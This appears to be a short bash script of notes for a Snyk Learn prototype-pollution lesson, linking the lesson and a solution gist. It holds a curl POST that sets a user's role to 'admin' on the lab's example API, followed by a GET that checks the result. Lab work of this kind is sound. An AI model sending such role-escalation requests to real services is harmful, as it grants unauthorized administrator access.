#!/usr/bin/env bash

cat << 'DESCRIPTION' >/dev/null
https://learn.snyk.io/lessons/prototype-pollution/javascript/

Solution: https://gist.github.com/pythoninthegrass/31ae011bed2b52fc732af45698af7196
DESCRIPTION

# post w/curl
curl -H "Content-Type: application/json" -X POST -d '{"role": "admin"}' https://api.startup.io/users/1337 && curl -X GET https://api.startup.io/users/1337/role
